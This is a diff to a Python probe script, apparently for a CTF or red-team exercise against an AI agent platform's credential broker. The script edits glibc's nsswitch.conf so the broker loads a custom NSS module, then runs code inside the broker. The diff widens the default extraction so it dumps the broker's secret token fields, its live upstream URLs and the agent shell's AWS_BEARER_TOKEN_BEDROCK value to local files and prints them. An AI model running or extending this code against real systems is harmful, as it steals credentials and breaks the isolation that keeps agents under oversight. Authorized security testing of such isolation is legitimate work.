@@ -3,8 +3,10 @@
 
 This probe tests whether a same-UID agent can modify glibc NSS configuration,
 cause the credential broker to load an NSS module, and execute code in the
-broker. By default, the CTF extraction mode writes selected values locally.
-Use --no-extract-ctf-values for presence-only evidence.
+broker. By default, the CTF extraction mode writes selected broker values,
+the broker's live upstream URLs, and the agent shell's Bedrock bearer
+environment value locally. Use
+--no-extract-ctf-values for presence-only evidence.
 """
 
 from __future__ import annotations
@@ -25,11 +27,12 @@ from pathlib import Path
 from typing import Any
 
 
-VERSION = "1.5"
+VERSION = "1.7"
 NSSWITCH = Path("/etc/nsswitch.conf")
 DEFAULT_WORK_ROOT = Path("/tmp/elt")
 STATE_FILENAME = "vega_nss_probe_active.json"
 BROKER_NEEDLE = "vega_agentcore.broker"
+BEDROCK_ENV_KEY = "AWS_BEARER_TOKEN_BEDROCK"
 SECRET_FIELDS = (
     "_token",
     "_ldso_cookie",
@@ -381,11 +384,14 @@ try:
             values={{k:getattr(obj,k,None) for k in {ctf_fields}}}
             if not all(v is None or isinstance(v,str) for v in values.values()):
                 raise TypeError('unexpected CTF credential field type')
+            upstream_urls=dict(obj._upstreams)
+            if not all(isinstance(k,str) and isinstance(v,str) for k,v in upstream_urls.items()):
+                raise TypeError('unexpected upstream URL type')
             path={str(values_path)!r}
             temp=path+'.tmp'
             fd=os.open(temp,os.O_WRONLY|os.O_CREAT|os.O_EXCL,0o600)
             with os.fdopen(fd,'w') as out:
-                json.dump({{'pid':os.getpid(),'values':values}},out,sort_keys=True)
+                json.dump({{'pid':os.getpid(),'values':values,'upstream_urls':upstream_urls}},out,sort_keys=True)
                 out.write('\\n')
                 out.flush()
                 os.fsync(out.fileno())
@@ -623,6 +629,14 @@ def classify(run_dir: Path) -> tuple[str, dict[str, Any] | None]:
 
 
 def show_ctf_values(run_dir: Path) -> None:
+    agent_env_path = run_dir / "agent_env_values.json"
+    if agent_env_path.exists():
+        agent_env = read_json(agent_env_path)
+        emit("AGENT_ENV_VALUES_FILE", str(agent_env_path))
+        value = agent_env.get(BEDROCK_ENV_KEY)
+        if value is not None:
+            emit("AGENT_ENV_VALUE", f"{BEDROCK_ENV_KEY}={json.dumps(value, ensure_ascii=True)}")
+
     path = run_dir / "ctf_values.json"
     if not path.exists():
         emit("WARN", f"CTF values file not found; check {run_dir / 'python_payload_error.txt'}")
@@ -633,6 +647,8 @@ def show_ctf_values(run_dir: Path) -> None:
         value = data["values"].get(field)
         if value is not None:
             emit("CTF_VALUE", f"{field}={json.dumps(value, ensure_ascii=True)}")
+    for route, url in sorted(data.get("upstream_urls", {}).items()):
+        emit("UPSTREAM_URL", f"{route}={json.dumps(url, ensure_ascii=True)}")
 
 
 def save_result(
@@ -712,6 +728,8 @@ def create_probe(args: argparse.Namespace, report: dict[str, Any]) -> dict[str, 
     run_id = f"{int(time.time())}-{os.getpid()}"
     run_dir = work_root / f"vega-nss-probe-{run_id}"
     run_dir.mkdir(mode=0o700)
+    if args.extract_ctf_values:
+        atomic_json(run_dir / "agent_env_values.json", {BEDROCK_ENV_KEY: os.environ.get(BEDROCK_ENV_KEY)})
     service = f"vgp{os.getpid():x}{int(time.time()) & 0xFFFF:x}"
     source = run_dir / "libnss_probe.c"
     built_module = run_dir / f"libnss_{service}.so.2"
@@ -985,7 +1003,7 @@ def parser() -> argparse.ArgumentParser:
         "--extract-ctf-values",
         dest="extract_ctf_values",
         action="store_true",
-        help="write up to four candidate broker credential values to a local mode-0600 file (default)",
+        help="write broker credentials, upstream URLs, and the agent's Bedrock bearer env value to local mode-0600 files (default)",
     )
     extraction.add_argument(
         "--no-extract-ctf-values",
